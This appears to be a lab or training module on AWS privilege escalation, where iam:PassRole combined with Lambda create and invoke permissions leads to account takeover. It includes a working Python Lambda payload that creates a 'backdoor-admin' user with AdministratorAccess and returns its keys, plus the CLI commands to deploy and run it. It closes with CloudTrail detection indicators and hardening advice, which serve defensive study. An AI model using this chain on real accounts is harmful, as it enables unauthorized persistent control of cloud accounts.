# Module 6 - Lambda Privilege Escalation via iam:PassRole

## Attack chain
Low-priv user with iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction
| Creates Lambda with admin role - Invokes it → Lambda creates backdoor admin user
| Persistent long-term admin credentials

## The three permissions
None of these alone escalates privileges:
- iam:PassRole - pass a role to an AWS service
- lambda:CreateFunction - create a Lambda function
- lambda:InvokeFunction - invoke a Lambda function

Combined they allow full account takeover.

## Exploitation

### Step 1 - Create malicious payload
```python
import boto3, json

def lambda_handler(event, context):
    iam = boto3.client('iam')
    iam.create_user(UserName='backdoor-admin')
    iam.attach_user_policy(
        UserName='backdoor-admin',
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )
    keys = iam.create_access_key(UserName='backdoor-admin')
    return {'AccessKeyId': keys['AccessKey']['AccessKeyId'],
            'SecretAccessKey': keys['AccessKey']['SecretAccessKey']}
```

### Step 2 - Create Lambda with admin role (as low-priv attacker)
```bash
aws lambda create-function \
  --function-name privesc-backdoor \
  --runtime python3.11 \
  --role arn:aws:iam::<account>:role/lambda-privesc-admin-role \
  --handler backdoor.lambda_handler \
  --zip-file fileb://backdoor.zip \
  --profile lambda-attacker
```

### Step 3 - Invoke it
```bash
aws lambda invoke --function-name privesc-backdoor /tmp/output.json
```
Returns backdoor-admin access keys with AdministratorAccess. AKIA prefix - permanent credentials.

## Impact
Full account takeover with persistent backdoor. Even if attacker account is detected
and disabled, backdoor-admin survives until manually found and deleted.

## Detection - CloudTrail indicators
- CreateFunction by low-priv user with high-privilege role in --role parameter
- InvokeFunction immediately after CreateFunction - automated attack signature
- CreateUser + AttachUserPolicy by Lambda execution role - backdoor creation pattern
- All three events in sequence within seconds = definitive escalation indicator

## Hardening
- Scope iam:PassRole to specific roles only, never Resource: "*"
  "Resource": "arn:aws:iam::<account>:role/specific-safe-role-only"
- Never grant iam:PassRole alongside lambda:CreateFunction to the same principal
- Monitor CreateFunction events where role ARN has AdministratorAccess attached
- CloudWatch alarm: CreateUser called by a Lambda execution role = immediate alert
